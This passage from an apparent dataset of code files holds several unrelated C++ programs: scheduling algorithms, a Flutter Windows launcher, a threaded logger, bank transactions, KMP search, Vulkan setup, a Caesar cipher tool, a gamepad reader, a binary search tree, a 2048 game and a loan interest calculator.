       currentTime++;\n            if(checkSJF(proc,n)){\n                cout<<endl;\n                for(int i=0;i<n;i++){\n                    proc[i].TurnAroundTime=proc[i].completionTime-proc[i].arrivalTime;\n                    proc[i].WaitingTime=proc[i].TurnAroundTime-proc[i].burstTime;\n                }\n                break;\n            }\n        }\n    }\n   print(proc,n);\n   cout<<\"*********************************************************************\"<<endl;\n}\n\nvoid RoundRobin(process proc[],int n,int time_quantum){\n    cout<<endl;\n    cout<<\"GANT CHART (order showing which process comp",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_calculadora\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//////////////////////////////////  @\u7248\u6743\u8bf4\u660e  //////////////////////////////////////////////////\r\n///\t\t\t\t\t\tJiedi(China nanjing)Ltd.                                    \r\n/// @\u7248\u6743\u8bf4\u660e \u4ee3\u7801\u548c\u8bfe\u7a0b\u7248\u6743\u6709\u590f\u66f9\u4fca\u6240\u62e5\u6709\u5e76\u5df2\u7ecf\u7533\u8bf7\u8457\u4f5c\u6743\uff0c\u6b64\u4ee3\u7801\u53ef\u7528\u4f5c\u4e3a\u5b66\u4e60\u53c2\u8003\u5e76\u53ef\u5728\u9879\u76ee\u4e2d\u4f7f\u7528\uff0c\r\n/// \u8bfe\u7a0b\u4e2d\u6d89\u53ca\u5230\u7684\u5176\u4ed6\u5f00\u6e90\u8f6f\u4ef6\uff0c\u8bf7\u9075\u5b88\u5176\u76f8\u5e94\u7684\u6388\u6743\r\n/// \u8bfe\u7a0b\u6e90\u7801\u4e0d\u53ef\u4ee5\u76f4\u63a5\u8f6c\u8f7d\u5230\u516c\u5f00\u7684\u535a\u5ba2\uff0c\u6216\u8005\u5176\u4ed6\u5171\u4eab\u5e73\u53f0\uff0c\u4e0d\u53ef\u4ee5\u7528\u4ee5\u5236\u4f5c\u5728\u7ebf\u8bfe\u7a0b\u3002\r\n/// \u8bfe\u7a0b\u4e2d\u6d89\u53ca\u5230\u7684\u5176\u4ed6\u5f00\u6e90\u8f6f\u4ef6\uff0c\u8bf7\u9075\u5b88\u5176\u76f8\u5e94\u7684\u6388\u6743  @@              \r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\n//////////////////////////////////  \u6e90\u7801\u8bf4\u660e  //////////////////////////////////////////////////\r\n/// \u9879\u76ee\u540d\u79f0: CMake\u6784\u5efa\u5927\u578bc++\u9879\u76ee\r\n/// \u535a\u5ba2   : \t\t\t    http://blog.csdn.net/jiedichina\r\n/// \u817e\u8baf\u8bfe\u5802\t\t\t    https://jiedi.ke.qq.com/\r\n/// \u5b66\u6d6a\t\t\t\t    \u641c\u7d22 \u590f\u66f9\u4fca\r\n/// \u8001\u590f\u8bfe\u5802\t\t\t    http://cppds.com \r\n/// CMake\u624b\u518c    \t        http://cmake.org.cn\r\n/// \uff01\uff01\uff01\u8bf7\u52a0\u5165\u8bfe\u7a0bqq\u7fa4 \u3010296249312\u3011\u4e0e\u540c\u5b66\u4ea4\u6d41 \r\n/// \u6b22\u8fce\u52a0\u590f\u66f9\u4fca\u8001\u5e08\u7684\u5fae\u4fe1\uff1acppxcj\r\n///\u52a0\u5165\u8001\u590f\u8bfe\u5802\u7fa4\u3010296249312\u3011\u76f4\u63a5\u8054\u7cfb\u7fa4\u91cc\u5ba2\u670d\u4e0b\u8f7d\u8bfe\u7a0b\u8d44\u6599\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n/////////////////////////////////// \u8bfe\u7a0b\u4ea4\u6d41qq\u7fa4296249312 //////////////////////////////////////\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\n//////////////////////////////////////// COMMENT ///////////////////////////////////////////////\r\n\r\n#include \"xlog_thread.h\"\r\n#include <chrono>\r\nusing namespace std;\r\n_XCPP_NAMESPACE_\r\n\r\nbool XLogThread::Init(const char* log_path, const char* filename)\r\n{\r\n\t//is_log_init = false;\r\n\tthis->log_path_ = log_path;\r\n\t//\u6d4b\u8bd5\u7528\uff0c\u540e\u671f\u6539\u4e3a\u6eda\u52a8\u65e5\u5fd7\u6587\u4ef6\r\n\tstring logfile = log_path;\r\n\tlogfile += filename;\r\n\tofs_.open(logfile, ios::app);\r\n\tif (ofs_)\r\n\t\treturn true;\r\n\treturn false;\r\n}\r\n\r\nint XLogThread::Write(const char* msg)\r\n{\r\n\t{\r\n\t\tlock_guard<mutex> lock(mux_);\r\n\t\tmsgs_.push(msg);  \r\n\t}\r\n\tcv_.notify_one();\r\n\treturn 0;\r\n}\r\n\r\nvoid XLogThread::Start()\r\n{\r\n\tth_ = thread(&XLogThread::Run, this);\r\n}\r\nvoid XLogThread::Stop()\r\n{\r\n\tif (!th_.joinable())\r\n\t\treturn;\r\n\tis_exit_ = true;\r\n\tcv_.notify_all();\r\n\tth_.join();\r\n}\r\n\r\nvoid XLogThread::Run()\r\n{\r\n\tfor(;;)\r\n\t{\r\n\t\tstring msg;\r\n\t\tunique_lock<mutex> lock(mux_);\t\r\n\t\tcv_.wait(lock, [this] \r\n        {\r\n            return is_exit_||!msgs_.empty();\r\n        });\r\n\t\twhile(!msgs_.empty())\r\n\t\t{\r\n\t\t\tmsg = move(msgs_.front());\r\n\t\t\tmsgs_.pop();\r\n\t\t\tlock.unlock();\r\n\t\t\tofs_ << msg << endl;\r\n\t\t\tcout << msg << endl;\r\n\t\t\tlock.lock();\r\n\t\t}\r\n\t\tif(is_exit_)\r\n\t\t\tbreak;\r\n\t}\r\n}\r\n\r\n\r\n_END_NAMESPACE_",
    "#include \"Transaction.h\"\r\n\r\n#include <cassert>\r\n#include <iostream>\r\n#include <stdexcept>\r\n\r\n#include \"Account.h\"\r\n\r\nnamespace {\r\n// RAII\r\nstruct Guard {\r\n  Guard(Account& account) : account_(&account) { account_->Lock(); }\r\n\r\n  ~Guard() { account_->Unlock(); }\r\n\r\n private:\r\n  Account* account_;\r\n};\r\n}  // namespace\r\n\r\nTransaction::Transaction() : fee_(1) {}\r\n\r\nTransaction::~Transaction() {}\r\n\r\nbool Transaction::Make(Account& from, Account& to, int sum) {\r\n  if (from.id() == to.id()) throw std::logic_error(\"invalid action\");\r\n\r\n  if (sum < 0) throw std::invalid_argument(\"sum can't be negative\");\r\n\r\n  if (sum < 100) throw std::logic_error(\"too small\");\r\n\r\n  if (fee_ * 2 > sum) return false;\r\n\r\n  Guard guard_from(from);\r\n  Guard guard_to(to);\r\n\r\n  Credit(to, sum);\r\n\r\n  bool success = Debit(from, sum + fee_);\r\n  if (!success) from.ChangeBalance(-sum);\r\n  SaveToDataBase(from, to, sum);\r\n  return success;\r\n}\r\n\r\nvoid Transaction::Credit(Account& accout, int sum) {\r\n  assert(sum > 0);\r\n  accout.ChangeBalance(sum);\r\n}\r\n\r\nbool Transaction::Debit(Account& accout, int sum) {\r\n  assert(sum > 0);\r\n  if (accout.GetBalance() > sum) {\r\n    accout.ChangeBalance(-sum);\r\n    return true;\r\n  }\r\n  return false;\r\n}\r\n\r\nvoid Transaction::SaveToDataBase(Account& from, Account& to, int sum) {\r\n  std::cout << from.id() << \" send to \" << to.id() << \" $\" << sum << std::endl;\r\n  std::cout << \"Balance \" << from.id() << \" is \" << from.GetBalance()\r\n            << std::endl;\r\n  std::cout << \"Balance \" << to.id() << \" is \" << to.GetBalance() << std::endl;\r\n}\r\n\r\n",
    "\n/*\n  \u5e94\u8be5\u8003\u8651\u4e00\u4e0b\u5e94\u8be5\u5b9e\u73b0\u4ec0\u4e48\u529f\u80fd\n*/\n\n\nclass Kmp{\npublic:\n    Kmp(){}\n\n\n    /*\n      \u83b7\u53d6kmp\u8868\u3002\n    */\n    static std::vector<int> getKmpTable(const std::string& t){\n        int len = 0, j = 1;\n        int m = (int)t.size();\n        std::vector<int> res;\n        res.resize(m);\n        while (j < m){\n            if (t[j] == t[len]){\n                res[j] = len;\n                j ++;\n                len ++;\n            }\n            else if (len){\n                len = res[len - 1];\n            }\n            else{\n                j ++;\n            }\n        }\n        return res;\n    }\n\n    /*\n      \u8fd4\u56de\u5339\u914d\u6210\u529f\u7684\u6b21\u6570\u3002\n    */\n    static size_t count(const std::string& s, const std::string& t, const std::vector<int>& table){\n        size_t m = t.size();\n        size_t n = s.size();\n        int res = 0;\n        for (int i = 0, j = 0; i < n; ++i){\n            if (s[i] == t[j]){\n                i ++;\n                j ++;\n                if (j == m){\n                    res ++;\n                    j = table[j - 1];\n                }\n            }\n            else if (j){\n                j = table[j - 1];\n            }\n            else{\n                i ++;\n            }\n        }\n        return res;\n    }\n\n    /*\n      \u8fd4\u56de\u9996\u6b21\u5339\u914d\u6210\u529f\u7684\u4f4d\u7f6e\u3002\n    */\n    static size_t find_first_of(const std::string s, const std::string& t, size_t pos, const std::vector<int>& table){\n        size_t m = t.size();\n        size_t n = s.size();\n        for (size_t i = pos, j = 0; i < n; ++i){\n            if (s[i] == t[j]){\n                i ++;\n                j ++;\n                if (j == m){\n                    return i - j;\n                }\n            }\n            else if (j){\n                j = table[j - 1];\n            }\n            else{\n                i ++;\n            }\n        }\n        return s.npos;\n    }\n\n    /*\n      \u8fd4\u56des\u4e2d\u6bcf\u4e00\u6b21\u4e0et\u5339\u914d\u6210\u529f\u7684\u4f4d\u7f6e\u3002\n    */\n    static std::vector<int> getPositionArray(const std::string& s, const std::string& t, const std::vector<int>& table){\n        std::vector<int> res;\n        size_t n = s.size();\n        size_t m = t.size();\n        for (int i = 0, j = 0; i < n; ++i){\n            if (s[i] == t[j]){\n                i ++;\n                j ++;\n                if (j == m){\n                    res.push_back(i - j);\n                    j = table[j - 1];\n                }\n            }\n            else if (j){\n                j = table[j - 1];\n            }\n            else{\n                i ++;\n            }\n        }\n        return res;\n    }\n\n\n};\n",
    "//#include <vulkan/vulkan.h>\n// or\n\n#define GLFW_INCLUDE_VULKAN  // in fact this is for C , for C++ #include <vulkan.hpp>\n#include <glfw3.h>\n// if you are using glfw go with second one\n#include \"Camera.h\"\n\n#include <iostream>\n#include <stdexcept>\n#include <cstdlib>\n#include <vector>\n#include <string>\n#include <map>\n#include <optional>\n#include <set>\n#include <cstdint>\n#include <limits>\n#include <algorithm>\n#include <fstream>\n#include <array>\n#define GLM_FORCE_RADIANS\n#define GLM_FORCE_DEFAULT_ALIGNED_GENTYPES// to prevent memory alignment issues\n#define GLM_FORCE_DEPTH_ZERO_TO_ONE\n#include <glm.hpp>\n#include <gtc/matrix_transform.hpp>\n#define GLM_ENABLE_EXPERIMENTAL\n#include <gtx/hash.hpp>\n\n#define STB_IMAGE_IMPLEMENTATION\n#include <stb_image.h>\n#define TINYOBJLOADER_IMPLEMENTATION\n#include <tiny_obj_loader.h>\n#include <chrono>\n#include <unordered_map>\n\nconst int MAX_FRAMES_IN_FLIGHT = 2;\n\nstatic std::vector<char> readFile(const std::string& filename) {\n    std::ifstream file(filename, std::ios::ate | std::ios::binary);\n\n    if (!file.is_open()) {\n        throw std::runtime_error(\"failed to open file\");\n    }\n\n    size_t fileSize = (size_t)file.tellg();\n    std::vector<char> buffer(fileSize);\n\n    file.seekg(0);\n    file.read(buffer.data(), fileSize);\n    file.close();\n\n    return buffer;\n}\n\nconst uint32_t WIDTH = 800;\nconst uint32_t HEIGHT = 600;\n\nconst char* M_BEAN = \"models/bean.obj\";\nconst char* T_BEAN = \"textures/bean.png\";\nconst char* M_VIKING = \"models/viking_room.obj\";\nconst char* T_VIKING = \"textures/viking_room.png\";\n\n\nconst std::string MODEL_PATH = M_BEAN;\nconst std::string TEXTURE_PATH = T_BEAN;\n\n\n\n\nconst std::vector<const char*> validationLayers = {\n    \"VK_LAYER_KHRONOS_validation\"\n};\n\nconst std::vector<const char*> deviceExtensions = {\n    VK_KHR_SWAPCHAIN_EXTENSION_NAME\n};\n\n#ifdef NDEBUG\nconst bool enableValidationLayers = false;\n#else\nbool enableValidationLayers = true;\n#endif\n\nVkResult CreateDebugUtilsMessengerEXT(\n    VkInstance instance, const VkDebugUtilsMessengerCreateInfoEXT* pCreateInfo,\n    const VkAllocationCallbacks* pAllocator, VkDebugUtilsMessengerEXT* pDebugMessenger) {\n\n    auto func = (PFN_vkCreateDebugUtilsMessengerEXT)vkGetInstanceProcAddr(instance, \"vkCreateDebugUtilsMessengerEXT\");\n    if (func != nullptr) {\n        return func(instance, pCreateInfo, pAllocator, pDebugMessenger);\n    }\n    else {\n        return VK_ERROR_EXTENSION_NOT_PRESENT;\n    }\n\n\n}\n\nvoid DestroyDebugUtilsMessengerEXT(VkInstance instance, VkDebugUtilsMessengerEXT debugMessenger, const VkAllocationCallbacks* pAllocator) {\n    auto func = (PFN_vkDestroyDebugUtilsMessengerEXT)vkGetInstanceProcAddr(instance, \"vkDestroyDebugUtilsMessengerEXT\");\n    if (func != nullptr) {\n        func(instance, debugMessenger, pAllocator);\n    }\n}\n\nstruct QueueFamilyIndices {\n    std::optional<uint32_t> graphicsFamily;\n    std::optional<uint32_t> presentFamily;\n    bool isComplete() {\n        return graphicsFamily.has_value() && presentFamily.has_value();\n    }\n};\n\nstruct SwapChainSupportDetails {\n    VkSurfaceCapabilitiesKHR capabilities;\n    std::vector<VkSurfaceFormatKHR> formats;\n    std::vector<VkPresentModeKHR> presentModes;\n};\n\nstatic void framebufferResizeCallback(GLFWwindow* window, int width, int height);\n\nstruct Vertex {\n    glm::vec3 pos;\n    glm::vec3 normal;\n    glm::vec2 texCoord;\n\n    static VkVertexInputBindingDescription getBindingDescription() {\n        VkVertexInputBindingDescription bindingDescription{};\n\n        bindingDescription.binding = 0;\n        bindingDescription.stride = sizeof(Vertex);\n        bindingDescription.inputRate = VK_VERTEX_INPUT_RATE_VERTEX;\n\n        return bindingDescription;\n    }\n\n    static std::array<VkVertexInputAttributeDescription, 3> getAttributeDescriptions() {\n        std::array<VkVertexInputAttributeDescription, 3> attributeDescriptions{};\n        //for vertex\n        attributeDescriptions[0].binding = 0;\n        attributeDescriptions[0].location = 0;\n        attributeDescriptions[0].format = VK_FORMAT_R32G32B32_SFLOAT;\n        attributeDescriptions[0].offset = offsetof(Vertex, pos);\n        //for normal\n        attributeDescriptions[1].binding = 0;\n        attributeDescriptions[1].location = 1;\n        attributeDescriptions[1].format = VK_FORMAT_R32G32B32_SFLOAT;\n        attributeDescriptions[1].offset = offsetof(Vertex, normal);\n\n        attributeDescriptions[2].binding = 0;\n        attributeDescriptions[2].location = 2;\n        attributeDescriptions[2].format = VK_FORMAT_R32G32_SFLOAT;\n        attributeDescriptions[2].offset = offsetof(Vertex, texCoord);\n\n        return attributeDescriptions;\n    }\n    bool operator==(const Vertex& other) const {\n        return pos == other.pos && normal == other.normal && texCoord == other.texCoord;\n    }\n};\n\nnamespace std {\n    template<> struct hash<Vertex> {\n        size_t operator()(Vertex const& vertex) const {\n            return ((hash<glm::vec3>()(vertex.pos) ^\n                (hash<glm::vec3>()(vertex.normal) << 1)) >> 1) ^\n  ",
    "/*\r\n    main.cpp\r\n\r\n    Basic encryption/decryption project using the Caesar cipher (Shift cipher)\r\n\r\n    Author: Gergana Karabelyova\r\n    Date: 03 June 2024\r\n*/\r\n\r\n#include<iostream>\r\n#include \"encryption.h\"\r\n\r\nusing namespace std;\r\n\r\nint main(){\r\n\r\n    string filename;\r\n    char mode; // encrypt or decrypt mode\r\n\r\n    cout<<\"Enter the filename: \";\r\n    getline(cin >> ws, filename); // ws = whitespace, it means \"ignore the whitespaces\"\r\n\r\n    cout << \"Encrypt (e) or Decrypt (d) ?\";\r\n    cin>> mode; \r\n\r\n    if(mode=='e' || mode=='E'){\r\n        if(encryptFile(filename, true)){\r\n            cout<<\"Encryption completed successfully.\" << endl;\r\n        }\r\n        else {\r\n            cerr << \"Error: Unable to perform encryption.\";\r\n        }\r\n    } \r\n    else if (mode=='d' || mode=='D'){\r\n        if(encryptFile(filename, false)){\r\n            cout<<\"Decryption completed successfully.\" << endl;\r\n        }\r\n        else {\r\n            cerr << \"Error: Unable to perform decryption.\";\r\n        }\r\n    }\r\n    else {\r\n        cerr << \"Error: Invalid mode selection. Use 'e' for encryption or 'd' for decryption.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "\ufeff#include <iostream>\n#include <windows.h>\n#include <Xinput.h>\n\n#pragma comment(lib, \"Xinput.lib\")\n\n// T\u1ea1o function Get Controller State \u0111\u1ec3 l\u1ea5y state c\u1ee7a Controller\nXINPUT_STATE GetControllerState() {\n    XINPUT_STATE state;\n    ZeroMemory(&state, sizeof(XINPUT_STATE));\n\n    // L\u1ea5y state c\u1ee7a Controller\n    DWORD result = XInputGetState(0, &state);\n\n    if (result != ERROR_SUCCESS) {\n        // Handle l\u1ed7i Controller kh\u00f4ng k\u1ebft n\u1ed1i \u0111\u01b0\u1ee3c (tr\u1ea3 v\u1ec1 empty state)\n        std::cerr << \"Controller is not connected\" << std::endl;\n    }\n\n    return state;\n}\n\nvoid PrintButtonState(WORD buttons, WORD buttonMask, const char* buttonName) {\n    if (buttons & buttonMask) {\n        std::cout << buttonName << \" pressed\" << std::endl;\n    }\n}\n\nint main()\n{   \n    while (true) {\n        XINPUT_STATE state = GetControllerState();\n\n        // In state c\u1ee7a buttons\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_DPAD_UP, \"DPAP UP\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_DPAD_DOWN, \"DPAD DOWN\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_DPAD_LEFT, \"DPAD LEFT\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_DPAD_RIGHT, \"DPAD RIGHT\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_START, \"START\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_BACK, \"BACK\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_LEFT_THUMB, \"LEFT THUMB\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_RIGHT_THUMB, \"RIGHT THUMB\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_LEFT_SHOULDER, \"LEFT SHOULDER\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_LEFT_SHOULDER, \"LEFT SHOULDER\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_A, \"A\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_B, \"B\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_X, \"X\");\n        PrintButtonState(state.Gamepad.wButtons, XINPUT_GAMEPAD_Y, \"Y\");\n\n        std::cout << \"Left Thumbstick: (\" << state.Gamepad.sThumbLX << \",\" << state.Gamepad.sThumbLY << \")\" << std::endl;\n        std::cout << \"Right Thumbstick: (\" << state.Gamepad.sThumbRX << \",\" << state.Gamepad.sThumbRY << \")\" << std::endl;\n\n        std::cout << \"Left Trigger: (\" << static_cast<int>(state.Gamepad.bLeftTrigger) << std::endl;\n        std::cout << \"Right Trigger: (\" << static_cast<int>(state.Gamepad.bRightTrigger) << std::endl;\n\n        Sleep(2000);\n    }\n\n    return 0;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct TreeNode{\n    int data;\n    TreeNode *left, *right;\n    TreeNode(int val) : data(val), left(NULL), right(NULL) {}\n};\n\nstruct BST{\nprivate:\n    TreeNode *root = NULL;\n    void _insert(int val, TreeNode *cur){\n        if(cur->data > val){\n            if(cur->left == NULL) \n                cur->left = new TreeNode(val);\n            else\n                _insert(val, cur->left);\n        }\n        else if(cur->data < val){\n            if(cur->right == NULL)\n                cur->right = new TreeNode(val);\n            else\n                _insert(val, cur->right);\n        }\n        else{\n            cout << \"Value Already exist, Insert another value\\n\";\n        }\n    }\n    bool _search(int val, TreeNode *cur){\n        if(cur == NULL) return false;\n\n        if(cur->data > val){\n            return _search(val, cur->left);\n        }\n        else if(cur->data < val){\n            return _search(val, cur->right);\n        }\n        else{\n            return true;\n        }\n    }\n    int _size(TreeNode *cur){\n        if(cur == NULL) return 0;\n        else{\n            return (1 + _size(cur->left) + _size(cur->right));\n        }\n    }\n    int _count_leafs(TreeNode *cur){\n        if(cur == NULL) return 0;\n        if(cur->left == NULL && cur->right == NULL) return 1;\n        return (_count_leafs(cur->left) + _count_leafs(cur->right));\n    }\n    TreeNode *min_node(TreeNode *cur){\n        if(cur == NULL || cur->left == NULL) return cur;\n        else return min_node(cur->left);\n    }\n    TreeNode *_delete(int val, TreeNode *cur){\n        if(cur == NULL) return NULL;\n        if(cur->data > val){\n            cur->left = _delete(val, cur->left);\n        }\n        else if(cur->data < val){\n            cur->right = _delete(val, cur->right);\n        }\n        else{\n            TreeNode *tmp = cur;\n\n            if(cur->left == NULL && cur->right == NULL){  // case 1: no child\n                cur = NULL;\n            }\n            else if(cur->left == NULL){                    // case 2: has right child only\n                cur = cur->right;\n            }\n            else if(cur->right == NULL){                   // case 3: has left child only\n                cur = cur->left;\n            }\n            else{                                           // case 4: has 2 children\n                TreeNode *mn = min_node(cur->right);\n                cur->data = mn->data;\n                cur->right = _delete(cur->data, cur->right);\n            }\n            delete tmp;\n        }\n        return cur;\n    }\n    void _inOrder(TreeNode *cur){\n        if(cur == NULL) return;\n\n        _inOrder(cur->left);\n        cout << cur->data << \" \";\n        _inOrder(cur->right);\n\n    };\n    void _preOrder(TreeNode *cur){\n        if(cur == NULL) return;\n\n        cout << cur->data << \" \";\n        _preOrder(cur->left);\n        _preOrder(cur->right);\n\n    };\n    void _postOrder(TreeNode *cur){\n        if(cur == NULL) return;\n\n        _postOrder(cur->left);\n        _postOrder(cur->right);\n        cout << cur->data << \" \";\n    };\n\npublic:\n\n    void insert(int val){\n        if(!root){\n            root = new TreeNode(val);\n        }\n        else{\n            _insert(val, root);\n        }\n    }\n    bool search(int val){\n        return _search(val, root);\n    }\n    int size(){\n        return _size(root);\n    }\n    int count_leafs(){\n        return _count_leafs(root);\n    }\n    void delete_node(int val){\n        _delete(val, root);\n    }\n    void inOrder(){\n        _inOrder(root);\n    }\n    void preOrder(){\n        _preOrder(root);\n    }\n    void postOrder(){\n        _postOrder(root);\n    }\n};\n\n\nint main() {\n    BST bst;\n    bst.insert(12);\n    bst.insert(15);\n    bst.insert(3);\n    bst.insert(35);\n    bst.insert(21);\n    bst.insert(42);\n    bst.insert(14);\n\n    cout << endl << \" ----------------- \" << endl;\n    cout << \"inorder :\"; bst.inOrder(); cout << endl;\n    cout << \"preorder :\"; bst.preOrder(); cout << endl;\n    cout << \"postorder :\"; bst.postOrder(); cout << endl;\n    cout << endl << \" ----------------- \" << endl;\n    cout << \"search 12 : \" << (bst.search(12) ? \"found\" : \"not found\") << endl;\n    cout << \"search 20 : \" << (bst.search(20) ? \"found\" : \"not found\") << endl;\n    cout << \"search 14 : \" << (bst.search(14) ? \"found\" : \"not found\") << endl;\n    cout << endl << \" ----------------- \" << endl;\n    cout << \"size : \" << bst.size() << endl;\n    cout << endl << \" ----------------- \" << endl;\n    cout << \"count leafs : \" << bst.count_leafs() << endl;\n    cout << endl << \" ----------------- \" << endl;\n    cout << \"delete 42 \" << endl;\n    bst.delete_node(42);\n    cout << endl << \" ----------------- \" << endl;\n    cout << \"inorder :\"; bst.inOrder(); cout << endl;\n    cout << \"preorder :\"; bst.preOrder(); cout << endl;\n    cout << \"postorder :\"; bst.postOrder(); cout << endl;\n\n\n}",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nstruct Game2048\n{\n    int board[4][4];\n\n    void score()\n    {\n        int score = 0;\n        for (int i = 0; i < 4; i++)\n        {\n            for (int j = 0; j < 4; j++)\n            {\n                if (board[i][j] == 2048)\n                    score += 1280;\n                if (board[i][j] == 1024)\n                    score += 640;\n                if (board[i][j] == 512)\n                    score += 320;\n                if (board[i][j] == 256)\n                    score += 160;\n                if (board[i][j] == 128)\n                    score += 80;\n                if (board[i][j] == 64)\n                    score += 40;\n                if (board[i][j] == 32)\n                    score += 20;\n                if (board[i][j] == 16)\n                    score += 10;\n                if (board[i][j] == 8)\n                    score += 5;\n            }\n        }\n        cout << \"Your Score \" << score << '\\n';\n    }\n\n    void random()\n    {\n        while (1)\n        {\n            int i = rand() % 4;\n            int j = rand() % 4;\n            if (board[i][j] == 0)\n            {\n                int value = rand() % 2;\n                if (value == 0)\n                    board[i][j] = 2;\n                else if (value == 1)\n                    board[i][j] = 4;\n                return;\n            }\n        }\n    }\n\n    void init()\n    {\n        for (int i = 0; i < 4; i++)\n        {\n            for (int j = 0; j < 4; j++)\n            {\n                board[i][j] = 0;\n            }\n        }\n        random();\n        random();\n    }\n\n    bool end()\n    {\n        for (int i = 0; i < 4; i++)\n        {\n            for (int j = 0; j < 4; j++)\n            {\n                if (board[i][j] == 0)\n                {\n                    return false;\n                }\n            }\n        }\n        return true;\n    }\n\n    void push(int array[])\n    {\n        int last_added = 4;\n        int merge = 1;\n        for (int i = 3; i >= 0; i--)\n        {\n            if (array[i] != 0)\n            {\n                if (merge)\n                {\n                    if (array[last_added] == array[i])\n                    {\n                        array[last_added] *= 2;\n                        array[i] = 0;\n                        merge = 0;\n                    }\n                    else\n                    {\n                        array[last_added - 1] = array[i];\n                        if (i != last_added - 1)\n                            array[i] = 0;\n                        last_added--;\n                        merge = 1;\n                    }\n                }\n                else\n                {\n                    array[last_added - 1] = array[i];\n                    if (i != last_added - 1)\n                        array[i] = 0;\n                    last_added--;\n                    merge = 1;\n                }\n            }\n        }\n        return;\n    }\n\n    void print()\n    {\n        for (int i = 0; i < 4; i++)\n        {\n\n            for (int j = 0; j < 4; j++)\n            {\n\n                if (board[i][j] != 0)\n                    cout << setw(4) << board[i][j];\n\n                else if (board[i][j] == 0)\n                    cout << setw(4) << \"-\";\n            }\n\n            cout << '\\n';\n\n            cout << \" ---------------\\n\";\n        }\n\n        score();\n\n        return;\n    }\n\n    void up()\n    {\n\n        int flag = 0;\n\n        for (int column = 0; column < 4; column++)\n        {\n\n            int array[4], array_check[4];\n\n            int count = 0;\n\n            for (int row = 0; row < 4; row++)\n            {\n\n                array[row] = board[3 - row][column];\n\n                array_check[row] = array[row];\n            }\n\n            push(array);\n\n            for (int i = 0; i < 4; i++)\n            {\n\n                if (array_check[i] == array[i])\n                    count++;\n            }\n\n            if (count == 4)\n                flag += 1;\n\n            for (int row = 0; row < 4; row++)\n            {\n\n                board[3 - row][column] = array[row];\n            }\n        }\n\n        if (flag == 4)\n            cout << \"Input Not Allowed!\\n\";\n\n        else\n        {\n\n            random();\n\n            print();\n        }\n\n        return;\n    }\n\n    void down()\n    {\n\n        int flag = 0;\n\n        for (int column = 0; column < 4; column++)\n        {\n\n            int array[4], array_check[4];\n\n            int count = 0;\n\n            for (int row = 0; row < 4; row++)\n            {\n\n                array[row] = board[row][column];\n\n                array_check[row] = array[row];\n            }\n\n            push(array);\n\n            for (int i = 0; i < 4; i++)\n            {\n\n                if (array_check[i] == array[i])\n                    count++;\n            }\n\n            if (count == 4)\n                flag += 1;\n\n            for (int row = 0; row < 4; row++)\n            {\n\n                board[row][column] = array[row];\n            }\n        }\n\n        if (flag == 4",
    "#include \"Facility.h\"\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <chrono>\n\n// Utility function to calculate the duration between two dates in years\ndouble calculateDuration(const std::string& startDate, const std::string& endDate) {\n    std::tm tmStart = {};\n    std::tm tmEnd = {};\n    std::istringstream ssStart(startDate);\n    std::istringstream ssEnd(endDate);\n    ssStart >> std::get_time(&tmStart, \"%d/%m/%Y\");\n    ssEnd >> std::get_time(&tmEnd, \"%d/%m/%Y\");\n    std::chrono::system_clock::time_point timeStart = std::chrono::system_clock::from_time_t(std::mktime(&tmStart));\n    std::chrono::system_clock::time_point timeEnd = std::chrono::system_clock::from_time_t(std::mktime(&tmEnd));\n    std::chrono::duration<double, std::ratio<3600 * 24 * 365>> duration = timeEnd - timeStart;\n    return duration.count();\n}\n\n// Class Facility\nFacility::Facility(const std::string& startDate, const std::string& endDate, double amount, double interestRate, Currency currency, std::vector<Lender> lenders)\n    : startDate(startDate), endDate(endDate), amount(amount), interestRate(interestRate), currency(currency), lenders(lenders) {}\n\ndouble Facility::calculateInterest() const {\n    double duration = calculateDuration(startDate, endDate);\n    return amount * interestRate * duration;\n}\n\nCurrency Facility::getCurrency() const {\n    return currency;\n}\n\ndouble Facility::getAmount() const {\n    return amount;\n}\n\ndouble Facility::getInterestRate() const {\n    return interestRate;\n}\n\nvoid Facility::display() const {\n    std::cout << \"Facility from \" << startDate << 